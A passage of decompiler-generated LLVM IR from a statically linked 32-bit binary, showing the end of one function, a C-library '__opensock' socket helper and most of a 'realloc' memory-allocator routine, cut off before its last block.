  uselistorder label %dec_label_pc_80660fb, { 1, 0 }
  uselistorder label %dec_label_pc_80660c1, { 1, 0 }
}

define i32 @__opensock(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_806610d = call i32 @socket(i32 10, i32 2, i32 0)
  %v2_8066115 = icmp slt i32 %v3_806610d, 0
  %v1_8066117 = icmp eq i1 %v2_8066115, false
  br i1 %v1_8066117, label %dec_label_pc_8066128, label %dec_label_pc_8066119

dec_label_pc_8066119:                             ; preds = %entry
  %v3_8066120 = call i32 @socket(i32 2, i32 2, i32 0)
  br label %dec_label_pc_8066128

dec_label_pc_8066128:                             ; preds = %entry, %dec_label_pc_8066119
  %v0_806612b = phi i32 [ %v3_806610d, %entry ], [ %v3_8066120, %dec_label_pc_8066119 ]
  ret i32 %v0_806612b

; uselistorder directives
  uselistorder label %dec_label_pc_8066128, { 1, 0 }
}

define i32 @realloc(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp8 = ptrtoint i32* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_806612c = load i32, i32* @ebp, align 4
  %v0_806612d = load i32, i32* @edi, align 4
  %v0_806612e = load i32, i32* @esi, align 4
  %v0_806612f = load i32, i32* @ebx, align 4
  %v4_8066133 = icmp eq i32* %arg1, null
  store i32 %arg2, i32* @ebx, align 4
  %v1_806613c = icmp eq i1 %v4_8066133, false
  br i1 %v1_806613c, label %dec_label_pc_806614e, label %dec_label_pc_806613e

dec_label_pc_806613e:                             ; preds = %entry
  store i32 %arg2, i32* %stack_var_-60, align 4
  %v1_8066142 = call i32 @malloc(i32 %arg2)
  store i32 %v1_8066142, i32* %eax.global-to-local, align 4
  store i32 %v1_8066142, i32* @ebx, align 4
  br label %dec_label_pc_8066455

dec_label_pc_806614e:                             ; preds = %entry
  %v1_806614e = icmp eq i32 %arg2, 0
  %v1_8066150 = icmp eq i1 %v1_806614e, false
  br i1 %v1_8066150, label %dec_label_pc_8066163, label %dec_label_pc_8066152

dec_label_pc_8066152:                             ; preds = %dec_label_pc_806614e
  store i32 %tmp8, i32* %stack_var_-60, align 4
  %v1_8066159 = call i32 @free(i32 %tmp8)
  store i32 %v1_8066159, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8066455

dec_label_pc_8066163:                             ; preds = %dec_label_pc_806614e
  %v2_806616e = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_806616e, i32* %eax.global-to-local, align 4
  store i32 %v2_806616e, i32* %stack_var_-60, align 4
  %v4_8066173 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134589241, i32 ptrtoint (i32* @global_var_8075530.598 to i32))
  store i32 %v4_8066173, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8075530.598 to i32), i32* %stack_var_-60, align 4
  %v1_806617f = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8075530.598 to i32))
  store i32 %v1_806617f, i32* %eax.global-to-local, align 4
  %v0_8066187 = load i32, i32* @ebx, align 4
  %tmp = icmp ult i32 %v0_8066187, -32
  br i1 %tmp, label %dec_label_pc_806619e, label %dec_label_pc_806618c

dec_label_pc_806618c:                             ; preds = %dec_label_pc_8066163
  %v0_806618c = load i32, i32* %stack_var_-60, align 4
  %v1_806618c = call i32 @__errno_location(i32 %v0_806618c)
  store i32 %v1_806618c, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_8066193 = inttoptr i32 %v1_806618c to i32*
  store i32 12, i32* %v1_8066193, align 4
  br label %dec_label_pc_8066458

dec_label_pc_806619e:                             ; preds = %dec_label_pc_8066163
  %v1_806619e = add i32 %v0_8066187, 11
  %tmp22 = icmp ult i32 %v1_806619e, 16
  br i1 %tmp22, label %dec_label_pc_80661b5, label %dec_label_pc_80661ae

dec_label_pc_80661ae:                             ; preds = %dec_label_pc_806619e
  %v1_80661ae = and i32 %v1_806619e, -8
  br label %dec_label_pc_80661b5

dec_label_pc_80661b5:                             ; preds = %dec_label_pc_806619e, %dec_label_pc_80661ae
  %stack_var_-40.0 = phi i32 [ %v1_80661ae, %dec_label_pc_80661ae ], [ 16, %dec_label_pc_806619e ]
  %storemerge21 = phi i32 [ %v1_80661ae, %dec_label_pc_80661ae ], [ %v1_806619e, %dec_label_pc_806619e ]
  store i32 %storemerge21, i32* %eax.global-to-local, align 4
  %v1_80661b9 = add i32 %tmp8, -8
  store i32 %v1_80661b9, i32* @edi, align 4
  %v1_80661bc = add i32 %tmp8, -4
  %v2_80661bc = inttoptr i32 %v1_80661bc to i32*
  %v3_80661bc = load i32, i32* %v2_80661bc, align 4
  store i32 %v3_80661bc, i32* %edx.global-to-local, align 4
  %v1_80661c1 = and i32 %v3_80661bc, -4
  store i32 %v1_80661c1, i32* %eax.global-to-local, align 4
  %v2_80661c4 = and i32 %v3_80661bc, 2
  %v3_80661c4 = icmp eq i32 %v2_80661c4, 0
  %v1_80661cb = icmp eq i1 %v3_80661c4, false
  br i1 %v1_80661cb, label %dec_label_pc_8066365, label %dec_label_pc_80661d1

dec_label_pc_80661d1:                             ; preds = %dec_label_pc_80661b5
  store i32 %stack_var_-40.0, i32* @ecx, align 4
  store i32 %v1_80661c1, i32* @ebx, align 4
  %v7_80661d7 = icmp ult i32 %v1_80661c1, %stack_var_-40.0
  %v1_80661d9 = icmp eq i1 %v7_80661d7, false
  br i1 %v1_80661d9, label %dec_label_pc_8066310, label %dec_label_pc_80661df

dec_label_pc_80661df:                             ; preds = %dec_label_pc_80661d1
  %v2_80661df = add i32 %v1_80661c1, %v1_80661b9
  store i32 %v2_80661df, i32* @esi, align 4
  %v1_80661e2 = load i32, i32* @global_var_807f42c.682, align 4
  %v12_80661e2 = icmp eq i32 %v2_80661df, %v1_80661e2
  %v1_80661e8 = icmp eq i1 %v12_80661e2, false
  %v1_8066222 = add i32 %v2_80661df, 4
  %v2_8066222 = inttoptr i32 %v1_8066222 to i32*
  %v3_8066222 = load i32, i32* %v2_8066222, align 4
  br i1 %v1_80661e8, label %dec_label_pc_8066222, label %dec_label_pc_80661ea

dec_label_pc_80661ea:                             ; preds = %dec_label_pc_80661df
  %v1_80661ef = and i32 %v3_8066222, -4
  %v2_80661f2 = add i32 %v1_80661ef, %v1_80661c1
  store i32 %v2_80661f2, i32* @ecx, align 4
  %v1_80661f8 = add i32 %stack_var_-40.0, 16
  store i32 %v1_80661f8, i32* %eax.global-to-local, align 4
  %v7_80661fb = icmp ult i32 %v2_80661f2, %v1_80661f8
  br i1 %v7_80661fb, label %dec_label_pc_8066260, label %dec_label_pc_80661ff

dec_label_pc_80661ff:                             ; preds = %dec_label_pc_80661ea
  %v1_80661ff = urem i32 %v3_80661bc, 2
  %v5_8066202 = or i32 %v1_80661ff, %stack_var_-40.0
  store i32 %v5_8066202, i32* %edx.global-to-local, align 4
  store i32 %v5_8066202, i32* %v2_80661bc, align 4
  %v0_806620d = load i32, i32* @ecx, align 4
  %v2_806620d = sub i32 %v0_806620d, %stack_var_-40.0
  %v0_806620f = load i32, i32* @edi, align 4
  %v2_806620f = add i32 %v0_806620f, %stack_var_-40.0
  store i32 %v2_806620f, i32* %eax.global-to-local, align 4
  %v1_8066212 = or i32 %v2_806620d, 1
  store i32 %v1_8066212, i32* @ecx, align 4
  store i32 %v2_806620f, i32* @global_var_807f42c.682, align 4
  %v2_806621a = add i32 %v2_806620f, 4
  %v3_806621a = inttoptr i32 %v2_806621a to i32*
  store i32 %v1_8066212, i32* %v3_806621a, align 4
  br label %dec_label_pc_8066443

dec_label_pc_8066222:                             ; preds = %dec_label_pc_80661df
  store i32 %v3_8066222, i32* %edx.global-to-local, align 4
  %v1_8066227 = and i32 %v3_8066222, -2
  store i32 %v1_8066227, i32* %eax.global-to-local, align 4
  %v3_806622a = add i32 %v1_8066222, %v1_8066227
  %v4_806622a = inttoptr i32 %v3_806622a to i8*
  %v5_806622a = load i8, i8* %v4_806622a, align 1
  %v6_806622a = urem i8 %v5_806622a, 2
  %v7_806622a = icmp eq i8 %v6_806622a, 0
  %v1_806622f = icmp eq i1 %v7_806622a, false
  br i1 %v1_806622f, label %dec_label_pc_8066260, label %dec_label_pc_8066231

dec_label_pc_8066231:                             ; preds = %dec_label_pc_8066222
  %v1_8066235 = and i32 %v3_8066222, -4
  store i32 %v1_8066235, i32* %edx.global-to-local, align 4
  %v2_8066238 = add i32 %v1_8066235, %v1_80661c1
  store i32 %v2_8066238, i32* @ebx, align 4
  %v10_806623a = icmp ult i32 %v2_8066238, %stack_var_-40.0
  br i1 %v10_806623a, label %dec_label_pc_8066260, label %dec_label_pc_8066240

dec_label_pc_8066240:                             ; preds = %dec_label_pc_8066231
  %v1_8066240 = add i32 %v1_80661c1, %tmp8
  %v2_8066240 = inttoptr i32 %v1_8066240 to i32*
  %v3_8066240 = load i32, i32* %v2_8066240, align 4
  store i32 %v3_8066240, i32* @edx, align 4
  %v1_8066243 = add i32 %v2_80661df, 12
  %v2_8066243 = inttoptr i32 %v1_8066243 to i32*
  %v3_8066243 = load i32, i32* %v2_8066243, align 4
  store i32 %v3_8066243, i32* %eax.global-to-local, align 4
  %v1_8066246 = add i32 %v3_8066240, 12
  %v2_8066246 = inttoptr i32 %v1_8066246 to i32*
  %v3_8066246 = load i32, i32* %v2_8066246, align 4
  %v15_8066246 = icmp eq i32 %v3_8066246, %v2_80661df
  %v1_8066249 = icmp eq i1 %v15_8066246, false
  br i1 %v1_8066249, label %dec_label_pc_8066250, label %dec_label_pc_806624b

dec_label_pc_806624b:                             ; preds = %dec_label_pc_8066240
  %v1_806624b = add i32 %v3_8066243, 8
  %v2_806624b = inttoptr i32 %v1_806624b to i32*
  %v3_806624b = load i32, i32* %v2_806624b, align 4
  %v15_806624b = icmp eq i32 %v3_806624b, %v2_80661df
  br i1 %v15_806624b, label %dec_label_pc_8066255, label %dec_label_pc_8066250

dec_label_pc_8066250:                             ; preds = %dec_label_pc_806624b, %dec_label_pc_8066240
  %v0_8066250 = call i32 @abort()
  store i32 %v0_8066250, i32* %eax.global-to-local, align 4
  %v1_8066255.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8066255

dec_label_pc_8066255:                             ; preds = %dec_label_pc_806624b, %dec_label_pc_8066250
  %v1_8066255 = phi i32 [ %v3_8066240, %dec_label_pc_806624b ], [ %v1_8066255.pre, %dec_label_pc_8066250 ]
  %v0_8066255 = phi i32 [ %v3_8066243, %dec_label_pc_806624b ], [ %v0_8066250, %dec_label_pc_8066250 ]
  %v2_8066255 = add i32 %v1_8066255, 12
  %v3_8066255 = inttoptr i32 %v2_8066255 to i32*
  store i32 %v0_8066255, i32* %v3_8066255, align 4
  %v0_8066258 = load i32, i32* @edx, align 4
  %v1_8066258 = load i32, i32* %eax.global-to-local, align 4
  %v2_8066258 = add i32 %v1_8066258, 8
  %v3_8066258 = inttoptr i32 %v2_8066258 to i32*
  store i32 %v0_8066258, i32* %v3_8066258, align 4
  %v0_8066310.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8066310

dec_label_pc_8066260:                             ; preds = %dec_label_pc_8066231, %dec_label_pc_8066222, %dec_label_pc_80661ea
  %v1_8066267 = add i32 %stack_var_-40.0, -7
  store i32 %v1_8066267, i32* %eax.global-to-local, align 4
  store i32 %v1_8066267, i32* %stack_var_-60, align 4
  %v1_806626b = call i32 @malloc(i32 %v1_8066267)
  store i32 %v1_806626b, i32* %eax.global-to-local, align 4
  %v1_8066273 = icmp eq i32 %v1_806626b, 0
  store i32 %v1_806626b, i32* %edx.global-to-local, align 4
  br i1 %v1_8066273, label %dec_label_pc_806643f, label %dec_label_pc_806627d

dec_label_pc_806627d:                             ; preds = %dec_label_pc_8066260
  %v1_806627d = add i32 %v1_806626b, -8
  store i32 %v1_806627d, i32* %ebx.global-to-local, align 4
  %v1_8066280 = load i32, i32* @esi, align 4
  %v12_8066280 = icmp eq i32 %v1_806627d, %v1_8066280
  %v1_8066282 = add i32 %v1_806626b, -4
  %v2_8066282 = inttoptr i32 %v1_8066282 to i32*
  %v3_8066282 = load i32, i32* %v2_8066282, align 4
  store i32 %v3_8066282, i32* %eax.global-to-local, align 4
  %v1_8066285 = icmp eq i1 %v12_8066280, false
  br i1 %v1_8066285, label %dec_label_pc_8066293, label %dec_label_pc_8066287

dec_label_pc_8066287:                             ; preds = %dec_label_pc_806627d
  store i32 %v1_80661c1, i32* %edx.global-to-local, align 4
  %v1_806628b = and i32 %v3_8066282, -4
  store i32 %v1_806628b, i32* %eax.global-to-local, align 4
  %v2_806628e = add i32 %v1_806628b, %v1_80661c1
  store i32 %v2_806628e, i32* @ebx, align 4
  br label %dec_label_pc_8066310

dec_label_pc_8066293:                             ; preds = %dec_label_pc_806627d
  %v1_8066297 = add i32 %v1_80661c1, -4
  store i32 %v1_8066297, i32* %eax.global-to-local, align 4
  %v2_806629c = udiv i32 %v1_8066297, 4
  store i32 %v2_806629c, i32* @ecx, align 4
  %tmp23 = icmp ult i32 %v1_8066297, 37
  br i1 %tmp23, label %dec_label_pc_80662b5, label %dec_label_pc_80662a4

dec_label_pc_80662a4:                             ; preds = %dec_label_pc_8066293
  store i32 %v1_806626b, i32* %stack_var_-60, align 4
  %v3_80662ab = inttoptr i32 %v1_806626b to i16*
  %v4_80662ab = call i32 @memcpy(i16* %v3_80662ab, i32 %tmp8, i32 %v1_8066297)
  store i32 %v4_80662ab, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80662fc

dec_label_pc_80662b5:                             ; preds = %dec_label_pc_8066293
  store i32 %tmp8, i32* @esi, align 4
  %v2_80662bc = load i32, i32* %arg1, align 4
  store i32 %v2_80662bc, i32* %eax.global-to-local, align 4
  %v2_80662be = inttoptr i32 %v1_806626b to i32*
  store i32 %v2_80662bc, i32* %v2_80662be, align 4
  %v0_80662c0 = load i32, i32* @esi, align 4
  %v1_80662c0 = add i32 %v0_80662c0, 4
  %v2_80662c0 = inttoptr i32 %v1_80662c0 to i32*
  %v3_80662c0 = load i32, i32* %v2_80662c0, align 4
  store i32 %v3_80662c0, i32* %eax.global-to-local, align 4
  %v1_80662c3 = load i32, i32* %edx.global-to-local, align 4
  %v2_80662c3 = add i32 %v1_80662c3, 4
  %v3_80662c3 = inttoptr i32 %v2_80662c3 to i32*
  store i32 %v3_80662c0, i32* %v3_80662c3, align 4
  %v0_80662c6 = load i32, i32* @esi, align 4
  %v1_80662c6 = add i32 %v0_80662c6, 8
  %v2_80662c6 = inttoptr i32 %v1_80662c6 to i32*
  %v3_80662c6 = load i32, i32* %v2_80662c6, align 4
  store i32 %v3_80662c6, i32* %eax.global-to-local, align 4
  %v1_80662c9 = load i32, i32* %edx.global-to-local, align 4
  %v2_80662c9 = add i32 %v1_80662c9, 8
  %v3_80662c9 = inttoptr i32 %v2_80662c9 to i32*
  store i32 %v3_80662c6, i32* %v3_80662c9, align 4
  %tmp24 = icmp ult i32 %v1_8066297, 17
  br i1 %tmp24, label %dec_label_pc_80662fc, label %dec_label_pc_80662ce

dec_label_pc_80662ce:                             ; preds = %dec_label_pc_80662b5
  %v0_80662ce = load i32, i32* @esi, align 4
  %v1_80662ce = add i32 %v0_80662ce, 12
  %v2_80662ce = inttoptr i32 %v1_80662ce to i32*
  %v3_80662ce = load i32, i32* %v2_80662ce, align 4
  store i32 %v3_80662ce, i32* %eax.global-to-local, align 4
  %v0_80662d1 = load i32, i32* @ecx, align 4
  %v1_80662d4 = load i32, i32* %edx.global-to-local, align 4
  %v2_80662d4 = add i32 %v1_80662d4, 12
  %v3_80662d4 = inttoptr i32 %v2_80662d4 to i32*
  store i32 %v3_80662ce, i32* %v3_80662d4, align 4
  %v0_80662d7 = load i32, i32* @esi, align 4
  %v1_80662d7 = add i32 %v0_80662d7, 16
  %v2_80662d7 = inttoptr i32 %v1_80662d7 to i32*
  %v3_80662d7 = load i32, i32* %v2_80662d7, align 4
  store i32 %v3_80662d7, i32* %eax.global-to-local, align 4
  %v1_80662da = load i32, i32* %edx.global-to-local, align 4
  %v2_80662da = add i32 %v1_80662da, 16
  %v3_80662da = inttoptr i32 %v2_80662da to i32*
  store i32 %v3_80662d7, i32* %v3_80662da, align 4
  %tmp25 = icmp ult i32 %v0_80662d1, 7
  br i1 %tmp25, label %dec_label_pc_80662fc, label %dec_label_pc_80662df

dec_label_pc_80662df:                             ; preds = %dec_label_pc_80662ce
  %v0_80662df = load i32, i32* @esi, align 4
  %v1_80662df = add i32 %v0_80662df, 20
  %v2_80662df = inttoptr i32 %v1_80662df to i32*
  %v3_80662df = load i32, i32* %v2_80662df, align 4
  store i32 %v3_80662df, i32* %eax.global-to-local, align 4
  %v0_80662e2 = load i32, i32* @ecx, align 4
  %v1_80662e5 = load i32, i32* %edx.global-to-local, align 4
  %v2_80662e5 = add i32 %v1_80662e5, 20
  %v3_80662e5 = inttoptr i32 %v2_80662e5 to i32*
  store i32 %v3_80662df, i32* %v3_80662e5, align 4
  %v0_80662e8 = load i32, i32* @esi, align 4
  %v1_80662e8 = add i32 %v0_80662e8, 24
  %v2_80662e8 = inttoptr i32 %v1_80662e8 to i32*
  %v3_80662e8 = load i32, i32* %v2_80662e8, align 4
  store i32 %v3_80662e8, i32* %eax.global-to-local, align 4
  %v1_80662eb = load i32, i32* %edx.global-to-local, align 4
  %v2_80662eb = add i32 %v1_80662eb, 24
  %v3_80662eb = inttoptr i32 %v2_80662eb to i32*
  store i32 %v3_80662e8, i32* %v3_80662eb, align 4
  %tmp26 = icmp ult i32 %v0_80662e2, 9
  br i1 %tmp26, label %dec_label_pc_80662fc, label %dec_label_pc_80662f0

dec_label_pc_80662f0:                             ; preds = %dec_label_pc_80662df
  %v0_80662f0 = load i32, i32* @esi, align 4
  %v1_80662f0 = add i32 %v0_80662f0, 28
  %v2_80662f0 = inttoptr i32 %v1_80662f0 to i32*
  %v3_80662f0 = load i32, i32* %v2_80662f0, align 4
  store i32 %v3_80662f0, i32* %eax.global-to-local, align 4
  %v1_80662f3 = load i32, i32* %edx.global-to-local, align 4
  %v2_80662f3 = add i32 %v1_80662f3, 28
  %v3_80662f3 = inttoptr i32 %v2_80662f3 to i32*
  store i32 %v3_80662f0, i32* %v3_80662f3, align 4
  %v0_80662f6 = load i32, i32* @esi, align 4
  %v1_80662f6 = add i32 %v0_80662f6, 32
  %v2_80662f6 = inttoptr i32 %v1_80662f6 to i32*
  %v3_80662f6 = load i32, i32* %v2_80662f6, align 4
  store i32 %v3_80662f6, i32* %eax.global-to-local, align 4
  %v1_80662f9 = load i32, i32* %edx.global-to-local, align 4
  %v2_80662f9 = add i32 %v1_80662f9, 32
  %v3_80662f9 = inttoptr i32 %v2_80662f9 to i32*
  store i32 %v3_80662f6, i32* %v3_80662f9, align 4
  br label %dec_label_pc_80662fc

dec_label_pc_80662fc:                             ; preds = %dec_label_pc_80662df, %dec_label_pc_80662ce, %dec_label_pc_80662b5, %dec_label_pc_80662a4, %dec_label_pc_80662f0
  %v0_80662ff = load i32, i32* %ebx.global-to-local, align 4
  %v1_80662ff = add i32 %v0_80662ff, 8
  store i32 %v1_80662ff, i32* @ebx, align 4
  store i32 %tmp8, i32* %stack_var_-60, align 4
  %v1_8066306 = call i32 @free(i32 %tmp8)
  br label %dec_label_pc_806643a

dec_label_pc_8066310:                             ; preds = %dec_label_pc_80661d1, %dec_label_pc_8066287, %dec_label_pc_8066255
  %v1_8066321 = phi i32 [ %v1_80661c1, %dec_label_pc_80661d1 ], [ %v2_806628e, %dec_label_pc_8066287 ], [ %v0_8066310.pre, %dec_label_pc_8066255 ]
  %v5_8066312 = sub i32 %v1_8066321, %stack_var_-40.0
  store i32 %v5_8066312, i32* @ecx, align 4
  %tmp27 = icmp ult i32 %v5_8066312, 16
  br i1 %tmp27, label %dec_label_pc_806631b, label %dec_label_pc_806632d

dec_label_pc_806631b:                             ; preds = %dec_label_pc_8066310
  %v0_806631b = load i32, i32* @edi, align 4
  %v1_806631b = add i32 %v0_806631b, 4
  %v2_806631b = inttoptr i32 %v1_806631b to i32*
  %v3_806631b = load i32, i32* %v2_806631b, align 4
  %v1_806631e = urem i32 %v3_806631b, 2
  %v2_8066321 = or i32 %v1_806631e, %v1_8066321
  store i32 %v2_8066321, i32* %eax.global-to-local, align 4
  store i32 %v2_8066321, i32* %v2_806631b, align 4
  %v0_8066326 = load i32, i32* @edi, align 4
  %v1_8066326 = load i32, i32* @ebx, align 4
  %v2_8066326 = add i32 %v0_8066326, 4
  %v3_8066326 = add i32 %v2_8066326, %v1_8066326
  %v4_8066326 = inttoptr i32 %v3_8066326 to i32*
  %v5_8066326 = load i32, i32* %v4_8066326, align 4
  %v6_8066326 = or i32 %v5_8066326, 1
  store i32 %v6_8066326, i32* %v4_8066326, align 4
  br label %dec_label_pc_806635d

dec_label_pc_806632d:                             ; preds = %dec_label_pc_8066310
  store i32 %stack_var_-40.0, i32* %edx.global-to-local, align 4
  %v0_8066331 = load i32, i32* @edi, align 4
  %v2_8066331 = add i32 %v0_8066331, %stack_var_-40.0
  store i32 %v2_8066331, i32* %eax.global-to-local, align 4
  %v1_8066334 = add i32 %v0_8066331, 4
  %v2_8066334 = inttoptr i32 %v1_8066334 to i32*
  %v3_8066334 = load i32, i32* %v2_8066334, align 4
  %v1_8066337 = urem i32 %v3_8066334, 2
  %v5_806633a = or i32 %v1_8066337, %stack_var_-40.0
  store i32 %v5_806633a, i32* %v2_8066334, align 4
  %v0_8066344 = load i32, i32* @ecx, align 4
  %v1_8066346 = or i32 %v0_8066344, 1
  store i32 %v1_8066346, i32* %edx.global-to-local, align 4
  %v1_8066349 = load i32, i32* %eax.global-to-local, align 4
  %v2_8066349 = add i32 %v1_8066349, 4
  %v3_8066349 = inttoptr i32 %v2_8066349 to i32*
  store i32 %v1_8066346, i32* %v3_8066349, align 4
  %v0_806634c = load i32, i32* %eax.global-to-local, align 4
  %v1_806634c = load i32, i32* @ecx, align 4
  %v2_806634c = add i32 %v0_806634c, 4
  %v3_806634c = add i32 %v2_806634c, %v1_806634c
  %v4_806634c = inttoptr i32 %v3_806634c to i32*
  %v5_806634c = load i32, i32* %v4_806634c, align 4
  %v6_806634c = or i32 %v5_806634c, 1
  store i32 %v6_806634c, i32* %v4_806634c, align 4
  %v0_8066351 = load i32, i32* %eax.global-to-local, align 4
  %v1_8066351 = add i32 %v0_8066351, 8
  store i32 %v1_8066351, i32* %eax.global-to-local, align 4
  store i32 %v1_8066351, i32* %stack_var_-60, align 4
  %v1_8066355 = call i32 @free(i32 %v1_8066351)
  store i32 %v1_8066355, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_806635d

dec_label_pc_806635d:                             ; preds = %dec_label_pc_806631b, %dec_label_pc_806632d
  %v0_806635d = load i32, i32* @edi, align 4
  %v1_806635d = add i32 %v0_806635d, 8
  store i32 %v1_806635d, i32* @ebx, align 4
  br label %dec_label_pc_8066447

dec_label_pc_8066365:                             ; preds = %dec_label_pc_80661b5
  store i32 %tmp8, i32* @ecx, align 4
  %v0_8066369 = load i32, i32* @global_var_807f75c.687, align 4
  store i32 %v0_8066369, i32* %eax.global-to-local, align 4
  %v2_8066372 = inttoptr i32 %v1_80661b9 to i32*
  %v3_8066372 = load i32, i32* %v2_8066372, align 4
  store i32 %v3_8066372, i32* @ebp, align 4
  %v1_8066375 = add i32 %v0_8066369, -1
  %v1_8066376 = or i32 %stack_var_-40.0, 4
  store i32 %v1_8066376, i32* %stack_var_-44, align 4
  %v2_806637c = add i32 %v1_8066375, %v3_8066372
  store i32 %v2_806637c, i32* %edx.global-to-local, align 4
  %v1_806637f = sub i32 0, %v0_8066369
  store i32 %v1_806637f, i32* %eax.global-to-local, align 4
  %v2_8066381 = add i32 %v2_806637c, %v1_8066376
  %v2_8066384 = and i32 %v2_8066381, %v1_806637f
  store i32 %v2_8066384, i32* @esi, align 4
  %v2_8066388 = sub i32 %v2_8066384, %v3_8066372
  store i32 %v2_8066388, i32* @ebx, align 4
  %v15_806638a = icmp eq i32 %v1_80661c1, %v2_8066388
  br i1 %v15_806638a, label %dec_label_pc_8066443, label %dec_label_pc_8066394

dec_label_pc_8066394:                             ; preds = %dec_label_pc_8066365
  %v2_8066396 = sub i32 %v1_80661b9, %v3_8066372
  store i32 %v2_8066396, i32* @edi, align 4
  %v2_806639d = add i32 %v3_8066372, %v1_80661c1
  store i32 %v2_806639d, i32* %eax.global-to-local, align 4
  store i32 %v2_8066396, i32* %stack_var_-60, align 4
  %v6_80663a1 = call i32 @mremap(i32 %v2_8066396, i32 %v2_806639d, i32 %v2_8066384, i32 1, i32 %v1_8066376, i32 %v1_80661c1)
  store i32 %v6_80663a1, i32* %eax.global-to-local, align 4
  %v10_80663a9 = icmp eq i32 %v6_80663a1, -1
  br i1 %v10_80663a9, label %dec_label_pc_80663fb, label %dec_label_pc_80663ae

dec_label_pc_80663ae:                             ; preds = %dec_label_pc_8066394
  %v1_80663ae = load i32, i32* @ebp, align 4
  %v2_80663ae = add i32 %v1_80663ae, %v6_80663a1
  store i32 %v2_80663ae, i32* %eax.global-to-local, align 4
  %v0_80663b0 = load i32, i32* @ebx, align 4
  %v1_80663b0 = or i32 %v0_80663b0, 2
  %v2_80663b3 = add i32 %v2_80663ae, 4
  %v3_80663b3 = inttoptr i32 %v2_80663b3 to i32*
  store i32 %v1_80663b0, i32* %v3_80663b3, align 4
  %v0_80663b6 = load i32, i32* @esi, align 4
  %v5_80663b8 = sub i32 %v0_80663b6, %v1_80661c1
  %v0_80663bc = load i32, i32* @global_var_807f770.691, align 16
  %v0_80663c2 = load i32, i32* %eax.global-to-local, align 4
  %v1_80663c2 = add i32 %v0_80663c2, 8
  store i32 %v1_80663c2, i32* @ebx, align 4
  %v1_80663c5 = load i32, i32* @global_var_807f764.693, align 4
  %v2_80663c5 = add i32 %v1_80663c5, %v5_80663b8
  store i32 %v2_80663c5, i32* @global_var_807f764.693, align 4
  %tmp20 = icmp ule i32 %v2_80663c5, %v0_80663bc
  %v5_80663d7 = select i1 %tmp20, i32 %v0_80663bc, i32 %v2_80663c5
  store i32 %v5_80663d7, i32* @ecx, align 4
  %v1_80663da = load i32, i32* @global_var_807f768.694, align 8
  %v2_80663da = add i32 %v1_80663da, %v2_80663c5
  store i32 %v5_80663d7, i32* @global_var_807f770.691, align 16
  %v1_80663e6 = load i32, i32* @global_var_807f774.695, align 4
  %tmp28 = icmp ule i32 %v2_80663da, %v1_80663e6
  %v5_80663ec = select i1 %tmp28, i32 %v1_80663e6, i32 %v2_80663da
  store i32 %v5_80663ec, i32* %edx.global-to-local, align 4
  store i32 %v5_80663ec, i32* @global_var_807f774.695, align 4
  br label %dec_label_pc_8066447

dec_label_pc_80663fb:                             ; preds = %dec_label_pc_8066394
  %v2_80663fb = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_80663fb, i32* %eax.global-to-local, align 4
  %v10_80663fe = icmp ult i32 %v1_80661c1, %v2_80663fb
  %v1_8066402 = icmp eq i1 %v10_80663fe, false
  br i1 %v1_8066402, label %dec_label_pc_8066443, label %dec_label_pc_8066404

dec_label_pc_8066404:                             ; preds = %dec_label_pc_80663fb
  %v1_806640b = add i32 %stack_var_-40.0, -7
  store i32 %v1_806640b, i32* %eax.global-to-local, align 4
  store i32 %v1_806640b, i32* %stack_var_-60, align 4
  %v1_806640f = call i32 @malloc(i32 %v1_806640b)
  store i32 %v1_806640f, i32* %eax.global-to-local, align 4
  %v1_8066417 = icmp eq i32 %v1_806640f, 0
  store i32 %v1_806640f, i32* @ebx, align 4
  br i1 %v1_8066417, label %dec_label_pc_806643f, label %dec_label_pc_806641d

dec_label_pc_806641d:                             ; preds = %dec_label_pc_8066404
  %v1_8066422 = add i32 %v1_80661c1, -8
  store i32 %v1_8066422, i32* %eax.global-to-local, align 4
  store i32 %v1_806640f, i32* %stack_var_-60, align 4
  %v3_806642b = inttoptr i32 %v1_806640f to i16*
  %v4_806642b = call i32 @memcpy(i16* %v3_806642b, i32 %tmp8, i32 %v1_8066422)
  store i32 %v4_806642b, i32* %eax.global-to-local, align 4
  store i32 %v1_806640f, i32* %edx.global-to-local, align 4
  store i32 %tmp8, i32* %stack_var_-60, align 4
  %v1_8066435 = call i32 @free(i32 %tmp8)
  br label %dec_label_pc_806643a

dec_label_pc_806643a:                             ; preds = %dec_label_pc_80662fc, %dec_label_pc_806641d
  %storemerge = phi i32 [ %v1_8066435, %dec_label_pc_806641d ], [ %v1_8066306, %dec_label_pc_80662fc ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8066447

dec_label_pc_806643f:                             ; preds = %dec_label_pc_8066404, %dec_label_pc_8066260
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8066447

dec_label_pc_8066443:                             ; preds = %dec_label_pc_80663fb, %dec_label_pc_8066365, %dec_label_pc_80661ff
  store i32 %tmp8, i32* @ebx, align 4
  br label %dec_label_pc_8066447

dec_label_pc_8066447:                             ; preds = %dec_label_pc_806643f, %dec_label_pc_806643a, %dec_label_pc_80663ae, %dec_label_pc_806635d, %dec_label_pc_8066443
  store i32 %v2_806616e, i32* %eax.global-to-local, align 4
  store i32 %v2_806616e, i32* %stack_var_-60, align 4
  %v3_8066450 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  store i32 %v3_8066450, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8066455

